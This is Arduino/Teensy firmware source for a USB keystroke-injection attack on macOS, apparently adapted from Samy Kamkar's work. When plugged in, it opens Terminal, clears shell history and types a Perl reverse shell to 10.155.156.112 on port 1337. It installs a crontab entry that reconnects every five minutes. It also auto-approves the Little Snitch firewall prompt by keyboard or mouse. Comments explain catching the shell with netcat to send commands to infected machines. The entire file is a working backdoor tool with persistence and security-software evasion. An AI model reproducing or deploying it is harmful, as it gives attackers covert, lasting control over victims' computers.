// This code was created by samy kamkar and changed by Tiago Vilas
// in order to listen for the backdoor installed, simply run netcat:
// nc -l 1337
// this listens on port 1337 for a connection from an infected machine
// and once connected, you can begin send commands to the machine!
// Changes made by Tiago Vilas
// removed DNS spoof sessions (it was not working properly so I decided to remove and fix in the future)
// fix backdoor payload to a constant session


#define BD "perl -e \' use Socket;\\$i=\\\"10.155.156.112\\\";\\$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};\'"
#define CRONBD "(crontab -l ; echo \"*/5 * * * * perl -e \' use Socket;\\$i=\\\"10.155.156.112\\\";\\$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};\'\")  | crontab -"
// delay ms
int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 11
#else
#define LED_PIN 13
#endif

// Choose if you want to have the Teensy submit Little Snitch with the mouse, or the keyboard.
// Uncomment USE_MOUSE to use the mouse instead of the keyboard to submit Little Snitch.
// #define USE_MOUSE

void setup()
{
  // give us a little time to connect up
  delay(500);
  
  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);

  // open spotlight (or alfred/qs), then System Preferences<return>
  //openapp("System Preferences");

  // now open Terminal
  openapp("Terminal");

  // open new terminal window
  cmd(KEY_N);
  pwnLittleSnitch();
  typeln("unset HISTFILE");
  typeln(CRONBD);

  // then close the terminal window
  typeln("");
  typeln("exit");

  // exit terminal (if nothing is running)
  cmd(KEY_Q);

  // in case another window is running in terminal,
  // don't quit terminal in popup window by hitting ESC
  k(KEY_ESC);  

  // we're done!
}


// type a string (pressing enter at the end)
// we have extra delays so we can see what's happening
void typeln(String chars)
{
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds * 4);
}

// open an application on OS X via spotlight/alfred
void openapp(String app)
{
  // open spotlight (or alfred/qs), then the app
  cmd(KEY_SPACE);
  typeln(app);
}


void k(int key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds/2);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds/2);
}

void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}

void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}

void shift(int key)
{
  mod(MODIFIERKEY_SHIFT, key);
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}

// evade little snitch if it's installed, but don't fumble if not installed
void pwnLittleSnitch()
{
  // connect to our reverse tunneled backdoor to
  // get little snitch to open if it's installed
  typeln(BD);

  // move our keyboard using the arrow keys to allow this host permanently ;)
  k(KEY_UP);
  k(KEY_LEFT);

  // go to beginning of line if there's no little snitch (Ctrl+A)
  // since we would still be in terminal
  ctrl(KEY_A);  // go to beginning of line (Ctrl+a)
  shift(KEY_3); // add a # (shift+3)
  ctrl(KEY_C);  // ^C to exit line (Ctrl+c)
  
// Here is where we submit Little Snitch with either a keyboard or mouse, based on what you selected above.
#ifdef USE_MOUSE

  // Move to top left of screen
   for (int i = 0; i < 1000; i++)
  {
    Mouse.move(-10, -10);
    delay(1);
  }

  // If we have hot corners enabled, move out and move back in
  for (int i = 0; i < 100; i++)
  {
    Mouse.move(1, 1);
    delay(5);
  }
  delay(500);

  // move to Little Snitch Allow button
  Mouse.move(100, 100);
  delay(20);
  Mouse.move(100, 100);
  delay(20);
  Mouse.move(120, -70);

  delay(1000);
  Mouse.click(); // Click click!
  delay(ds);
}

#else
  cmd(KEY_ENTER); // submit little snitch with keyboard.
#endif
  delay(ds);
}








